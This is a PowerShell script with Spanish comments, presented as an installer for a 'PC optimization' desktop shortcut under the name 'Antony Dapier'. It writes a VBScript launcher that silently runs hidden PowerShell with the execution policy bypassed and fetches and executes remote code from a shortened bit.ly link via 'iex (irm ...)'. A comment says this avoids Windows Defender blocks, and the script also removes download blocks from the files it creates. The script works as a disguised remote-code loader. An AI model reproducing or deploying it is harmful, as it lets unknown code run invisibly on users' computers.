# Script para crear el acceso directo al mantenimiento remoto
Add-Type -AssemblyName System.Windows.Forms, PresentationFramework

$Desktop = [System.Environment]::GetFolderPath('Desktop')
$ShortcutPath = Join-Path $Desktop "Optimizar PC - Antony Dapier.lnk" # Nombre del acceso directo
$AppDir = Join-Path $env:LOCALAPPDATA "AntonyDapier"
$VbsFile = Join-Path $AppDir "launcher.vbs"

# 1. Crear carpeta local si no existe
if (-not (Test-Path $AppDir)) { New-Item -ItemType Directory -Path $AppDir -Force | Out-Null }

# 2. Crear un lanzador VBScript (Evita el flash de consola y bloqueos de Windows Defender)
$VbsContent = @"
Set objShell = CreateObject("WScript.Shell")
command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""iex (irm https://bit.ly/mandia-windows)"""
objShell.Run command, 0, False
"@
$VbsContent | Set-Content -Path $VbsFile -Force
Unblock-File -Path $VbsFile

# 3. Crear el acceso directo apuntando al lanzador VBS
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)
# Usamos wscript.exe para ejecutar el lanzador de forma invisible
$Shortcut.TargetPath = "wscript.exe"
$Shortcut.Arguments = """$VbsFile"""
$Shortcut.IconLocation = "imageres.dll,109" 
$Shortcut.Description = "Mantenimiento y Optimización Antony Dapier"
$Shortcut.Save()

# Quitar bloqueo de descarga al acceso directo
Unblock-File -Path $ShortcutPath

[System.Windows.MessageBox]::Show("¡Instalación Finalizada!`n`nEl icono ya está en tu escritorio. No mostrará ventanas negras al iniciar.", "Antony Dapier")

[System.Windows.MessageBox]::Show("¡Instalación completada!`n`nSe ha creado el acceso directo 'Optimizar PC - Antony Dapier' en tu escritorio. Ya puedes usar la herramienta.", "Antony Dapier - Mantenimiento", "OK", "Information")
